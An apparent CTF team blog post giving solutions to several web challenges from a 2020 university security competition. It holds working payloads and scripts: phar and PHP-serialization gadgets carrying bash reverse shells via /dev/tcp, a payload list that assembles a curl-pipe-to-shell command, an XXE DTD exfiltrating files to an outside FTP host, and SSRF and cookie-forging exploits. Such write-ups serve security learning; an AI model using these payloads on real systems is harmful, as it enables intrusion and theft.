<!DOCTYPE html>
<html>
  
<head>
  <meta charset="utf-8">
  <meta name="author" content="Suers" />
  
  
  <title>高校战“疫”网络安全分享赛 2020 SU Write Up | su-team</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="CTF," />
  

  
  <meta name="description" content="SU">

  

  

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
  

  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
    welcome: {"enable":false,"interval":30},
    start_time: "2018-02-10",
    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
    is_post: true,
    lock: false,
    author: "Suers",
    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  
<script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>


  
    <link rel="icon" href="/images/SU.ico">
    <link rel="apple-touch-icon" href="/images/SU.png">
  

  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  
<link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">


  
<meta name="generator" content="Hexo 6.3.0"></head>
  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">SU</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | Write ups of TEAM-SU</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首页</a>
      
        <a href="/archives/" target="_self">归档</a>
      
        <a href="/tags/" target="_self">标签</a>
      
        <a href="/about/" target="_self">关于</a>
      
        <a href="/links/" target="_self">成员</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/team-su/" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首页
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            归档
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/tags/" target="_self">
            标签
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/about/" target="_self">
            关于
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/links/" target="_self">
            成员
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2020-03-10
    </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    高校战“疫”网络安全分享赛 2020 SU Write Up
  </h1>
  
  <article class="passage-article">
    <p>[TOC]</p>
<hr>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP UAF"></a>PHP UAF</h3><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p>
<h3 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Listfile</span>(<span class="string">&#x27;/ &amp;&amp; bash -c &quot;sh &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Fileupload</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<p>上 rogue mysql 配合上传的 jpg，用<code>phar</code>触发反序列化。</p>
<h3 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h3><p><code>username=admini&amp;password=&#39;-0-&#39;</code></p>
<h3 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg==</span><br></pre></td></tr></table></figure>
<p>直接改secret</p>
<h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><p>payload.txt<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">&gt;sh</span><br><span class="line">&gt;ba\</span><br><span class="line">&gt;\%7C\</span><br><span class="line">&gt;51\</span><br><span class="line">&gt;0.\</span><br><span class="line">&gt;13\</span><br><span class="line">&gt;1.\</span><br><span class="line">&gt;6\</span><br><span class="line">&gt;2.\</span><br><span class="line">&gt;18\</span><br><span class="line">&gt;\%20\</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh%20x</span><br><span class="line">sh%20g</span><br></pre></td></tr></table></figure><br>poc.py<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line">url = &#x27;http://121.36.222.22:88/core/&#x27;</span><br><span class="line">url1 = &#x27;http://121.36.222.22:88/upload_sign.php&#x27;</span><br><span class="line">post1=&#123;</span><br><span class="line">    &quot;sign&quot;:&#x27;|O:4:&quot;info&quot;:2:&#123;s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:2:&quot;ls&quot;;&#125;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">payload = &quot;compress.zlib://data:@127.0.0.1/888?,&#123;&#125;&quot;</span><br><span class="line">req.post(url1,data=post1)</span><br><span class="line">text = req.get(url).content.decode(&quot;utf-8&quot;)</span><br><span class="line">if len(text)&lt;15:</span><br><span class="line">    print(text)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[+]start attack!!!&quot;)</span><br><span class="line">with open(&quot;payload.txt&quot;,&quot;r&quot;) as f:</span><br><span class="line">    for i in f:</span><br><span class="line">        i=i.rstrip(&quot;\n&quot;)</span><br><span class="line">        #print(payload.format(i))</span><br><span class="line">        post_payload=&#123;</span><br><span class="line">            &quot;url&quot;:payload.format(i)</span><br><span class="line">        &#125;</span><br><span class="line">        print(post_payload)</span><br><span class="line">        text = req.post(url,data=post_payload).content.decode(&quot;utf-8&quot;)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        if len(text)&gt;42:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[+]&quot;+payload.format(i)+&#x27;\n&#x27;+text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h3 id="baby-java"><a href="#baby-java" class="headerlink" title="baby_java"></a>baby_java</h3><p>有个直接可以反射出来的点, 但是长度有限制, 最多读读 /etc/hostname, 这里采用 ftp xxe 读 /hint.txt<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">data</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///hint.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;ftp://somewhere.someplace:19132/%data;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><br>之后在 payload 里面引用一下这个 dtd 就行了.<br>hint.txt 里面写了<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method%uFF1A post  </span><br><span class="line">Path %uFF1A /you_never_know_the_path</span><br><span class="line"></span><br><span class="line">...pom.xml</span><br></pre></td></tr></table></figure><br>里面有 fastjson-1.2.48, commons-collections-3.1, commons-configuration-1.6. 可以猜到基本上是 fastjson -&gt; ldap -&gt; 本地 gadget 反序列化.<br>直接打会有 waf 拦截, 会拦掉 “type” 和 “prefix”, “\u”, 这里看 fastjson 源码发现<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">scanString</span><span class="params">()</span> &#123;</span><br><span class="line">           np = bp;</span><br><span class="line">           hasSpecial = <span class="literal">false</span>;</span><br><span class="line">           <span class="type">char</span> ch;</span><br><span class="line">           <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">               ch = next();</span><br><span class="line">   </span><br><span class="line">               <span class="keyword">if</span> (ch == <span class="string">&#x27;\&quot;&#x27;</span>) &#123;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">   </span><br><span class="line">               <span class="keyword">if</span> (ch == EOI) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!isEOF()) &#123;</span><br><span class="line">                       putChar((<span class="type">char</span>) EOI);</span><br><span class="line">                       <span class="keyword">continue</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;unclosed string : &quot;</span> + ch);</span><br><span class="line">               &#125;</span><br><span class="line">   </span><br><span class="line">               <span class="keyword">if</span> (ch == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!hasSpecial) &#123;</span><br><span class="line">                   <span class="comment">// ...</span></span><br><span class="line">                     <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                           <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> next();</span><br><span class="line">                           <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> next();</span><br><span class="line">   </span><br><span class="line">                           <span class="type">boolean</span> <span class="variable">hex1</span> <span class="operator">=</span> (x1 &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; x1 &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">                                   || (x1 &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; x1 &lt;= <span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">                                   || (x1 &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; x1 &lt;= <span class="string">&#x27;F&#x27;</span>);</span><br><span class="line">                           <span class="type">boolean</span> <span class="variable">hex2</span> <span class="operator">=</span> (x2 &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; x2 &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">                                   || (x2 &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; x2 &lt;= <span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">                                   || (x2 &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; x2 &lt;= <span class="string">&#x27;F&#x27;</span>);</span><br><span class="line">                           <span class="keyword">if</span> (!hex1 || !hex2) &#123;</span><br><span class="line">                               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid escape character \\x&quot;</span> + x1 + x2);</span><br><span class="line">                           &#125;</span><br><span class="line">   </span><br><span class="line">                           <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>) (digits[x1] * <span class="number">16</span> + digits[x2]);</span><br><span class="line">                           putChar(x_char);</span><br><span class="line">                           <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><br>可以看到 fastjson 支持标准里面没有的表示方式. Lexer 实际会对 \x12 这种表示方式进行转义. 用着这种方式可以绕掉对 type 的拦截.<br>但是 prefix 仍然不行, 多次尝试发现可以利用 fastjson smartMatch 的特性, 在 prefix 前面加个 - 就可以绕过了, _ 却不行…, 这 waf 有点迷惑….<br>之后就是常规套路, 不多讲了</p>
<h3 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.179.47:1101/?head=\&amp;url=http://127.0.0.1/&amp;begin=%s%</span><br></pre></td></tr></table></figure>
<p>就可以 ssrf, fuzz 出来 8080 有个服务. 根据 <code>/tmp/&#123;file&#125;</code> 发现是格式化字符串漏洞.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.179.47:1101/?head=\&amp;url=http://127.0.0.1:8080/read/file=&#123;file.__init__.__globals__[vip].__init__.__globals__&#125;%26vipcode=0&amp;begin=%s%</span><br></pre></td></tr></table></figure><br>读到 vipcode 之后就可以随便读文件了. 但是把 flag 所在文件夹里面的 fl4g 给 ban 了<br>这里审计一下代码, 先访问一次根目录覆盖 current_folder_file<br>之后<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.179.47:1101/?head=\&amp;begin=%s%&amp;url=http%3A%2F%2F127.0.0.1%3A8080%2Fread%2Ffile%3D&#123;vipfile.__init__.__globals__[current_folder_file][21]&#125;/flag%26vipcode%3DBWUTtnq6d8myKFvJ3wk1VfrecL5ZGQa4Cx9uNpoDHPEiOj7S</span><br></pre></td></tr></table></figure><br>就可以了</p>
<h3 id="NothardWeb"><a href="#NothardWeb" class="headerlink" title="NothardWeb"></a>NothardWeb</h3><p>生成的时候 &amp; 0x5f5e0ff 了一下, 密钥空间有限, <code>2**19</code>, 爆破就行了<br>里面是个<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cc</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cc</span>, <span class="number">0</span>, <span class="number">6</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>?cc=`$cc`;anything you want to execute;<br>就能绕过, 最里面 tomcat 用 PUT 方法那个 CVE 就能直接写 shell.</p>
<p>最后脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote, unquote</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.get(<span class="string">&#x27;http://121.37.161.79:2333/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">enc = unquote(sess.cookies[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line"></span><br><span class="line">sess.cookies.pop(<span class="string">&#x27;hash&#x27;</span>)</span><br><span class="line">sess.cookies.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">part = enc[-<span class="number">16</span>:]</span><br><span class="line">iv = part[:<span class="number">8</span>]</span><br><span class="line">enc = part[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">mask = <span class="built_in">bin</span>(<span class="number">0x5f5e0ff</span>)[<span class="number">2</span>:]</span><br><span class="line">pos = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seq, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(mask):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        pos.append(seq)</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> key</span><br><span class="line">key = [<span class="number">0</span>] * <span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l2i</span>(<span class="params">l</span>):</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        r &lt;&lt;= <span class="number">1</span></span><br><span class="line">        r ^= i</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padz</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(s) % <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s + <span class="built_in">bytearray</span>([(<span class="number">8</span> - <span class="built_in">len</span>(s) % <span class="number">8</span>)]) * (<span class="number">8</span> - <span class="built_in">len</span>(s) % <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm.tqdm(itertools.product(*[[<span class="number">0</span>, <span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>)])):</span><br><span class="line">    <span class="keyword">for</span> seq, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(i):</span><br><span class="line">        key[pos[seq]] = v</span><br><span class="line">    t = <span class="built_in">bytearray</span>(<span class="built_in">str</span>(l2i(key)), <span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    t += (t + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(t) % <span class="number">8</span>))</span><br><span class="line">    t = t[:<span class="number">8</span>]</span><br><span class="line">    </span><br><span class="line">    des = DES.new(t, DES.MODE_ECB)</span><br><span class="line">    t = des.decrypt(enc)</span><br><span class="line">    t = strxor(iv, t)</span><br><span class="line">    <span class="keyword">if</span> t == <span class="string">b&#x27;;&#125;\x06\x06\x06\x06\x06\x06&#x27;</span>:</span><br><span class="line">        <span class="built_in">globals</span>()[<span class="string">&#x27;key&#x27;</span>] = padz(<span class="built_in">str</span>(l2i(key)).encode())[:<span class="number">8</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake = <span class="string">b&#x27;O:4:&quot;User&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span></span><br><span class="line">digest = hashlib.md5(fake).hexdigest()</span><br><span class="line">iv = <span class="string">b&#x27;85196940&#x27;</span></span><br><span class="line"></span><br><span class="line">des = DES.new(key, DES.MODE_CBC, iv=iv)</span><br><span class="line">fake = des.encrypt(pad(fake))</span><br><span class="line"></span><br><span class="line">fake = base64.b64encode(fake)</span><br><span class="line">fake = base64.b64encode(fake)</span><br><span class="line"></span><br><span class="line">sess.cookies[<span class="string">&#x27;hash&#x27;</span>] = digest</span><br><span class="line">sess.cookies[<span class="string">&#x27;user&#x27;</span>] = quote(fake.decode())</span><br><span class="line"></span><br><span class="line">res = sess.get(<span class="string">&#x27;http://121.37.161.79:2333/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">fake = <span class="string">&#x27;O:10:&quot;SoapClient&quot;:4:&#123;s:3:&quot;uri&quot;;s:5:&quot;rmbbb&quot;;s:8:&quot;location&quot;;s:124:&quot;http://10.10.1.12/index.php?cc=%60%24cc%60%3Bbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F111.111.111.111%2F19132+0%3E%261%22%3B&quot;;s:15:&quot;_stream_context&quot;;i:0;s:13:&quot;_soap_version&quot;;i:1;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">fake = fake.encode()</span><br><span class="line">digest = hashlib.md5(fake).hexdigest()</span><br><span class="line">iv = <span class="string">b&#x27;85196940&#x27;</span></span><br><span class="line"></span><br><span class="line">des = DES.new(key, DES.MODE_CBC, iv=iv)</span><br><span class="line">fake = des.encrypt(pad(fake))</span><br><span class="line"></span><br><span class="line">fake = base64.b64encode(fake)</span><br><span class="line">fake = base64.b64encode(fake)</span><br><span class="line"></span><br><span class="line">sess.cookies[<span class="string">&#x27;hash&#x27;</span>] = digest</span><br><span class="line">sess.cookies[<span class="string">&#x27;user&#x27;</span>] = quote(fake.decode())</span><br><span class="line"></span><br><span class="line">res = sess.get(<span class="string">&#x27;http://121.37.161.79:2333/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></p>
<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](netdoc://xxxx)</span><br></pre></td></tr></table></figure>
